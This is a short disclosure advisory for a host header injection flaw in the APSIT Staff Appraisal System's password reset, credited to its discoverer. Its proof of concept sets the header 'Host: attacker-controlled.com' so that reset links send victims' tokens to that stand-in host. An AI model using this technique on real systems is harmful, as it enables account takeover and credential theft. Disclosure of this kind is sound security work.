# CVE-2024-42915: Host Header Injection in Forgot Password of APSIT Staff Appraisal System

A host header injection vulnerability exists in the forgot password functionality of APSIT Staff Appraisal System. By sending a specially crafted host header in the forgot password request, it is possible to send password reset links to users which, once clicked, lead to an attacker-controlled server and thus leak the password reset token. This may allow an attacker to reset other users' passwords.

PoC: 

- We trigger the forgot password functionality for an existing user, such as `staff1@email.com`, and provide a malicious host header: `Host: attacker-controlled.com`.
- This sends a password reset email to `staff1@email.com` that contains the following:
```
You are receiving this because you (or someone else) have requested the reset of the password for your account.
Please click on the following link, or paste this into your browser to complete the process:
http://attacker-controlled.com/forgot/reset/faculty/<token> 
If you did not request this, please ignore this email and your password will remain unchanged.
```
- Note the host being `attacker-controlled.com`.
- When `staff1` clicks the link and attempts to use the password reset token, the token is leaked to the attacker which would allow resetting `staff1's` password and taking over his account.

Discovered by Sourajeet Majumder, August 2024.
